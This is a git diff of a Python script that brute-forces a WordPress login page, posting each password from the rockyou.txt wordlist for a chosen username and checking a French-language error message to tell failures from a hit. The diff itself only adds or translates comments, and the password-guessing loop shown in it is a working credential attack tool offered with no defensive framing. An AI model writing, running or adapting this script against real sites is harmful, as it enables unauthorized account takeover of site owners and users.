@@ -1,11 +1,11 @@
 import requests
 
-url = ''
-username = ''
+url = '' # Enter the url + wp-login
+username = '' # Enter the username
 passwd_path = '/usr/share/wordlists/rockyou.txt'
 
 headers = {
-	'Host': '',
+	'Host': '', # Enter the host (domain)
 	'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check',
 	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
 }
@@ -14,11 +14,11 @@ data = {
 	'log': username,
 	'pwd': "",
 	'wp-submit': 'Se+connecter',
-	'redirect_to': '',
+	'redirect_to': '', # Send a request to burp repeater to know it
 	'testcookie': '1',
 }
 
-# Boucle de brute de force
+#Loop of brute force
 with open(passwd_path, 'r') as file:
 	for password in file:
 		password = password.strip()
@@ -27,7 +27,7 @@ with open(passwd_path, 'r') as file:
 
 		req = requests.post(url, headers=headers,data=data)
 
-		# Conditions pour savoir si le passwd a été trouvé
+		# Conditions to know if the password as be found
 		if "ce mot de passe ne correspond pas à l’identifiant" in req.text:
 			print(f"[-] Not found with {data['pwd']}")
 			print(req)
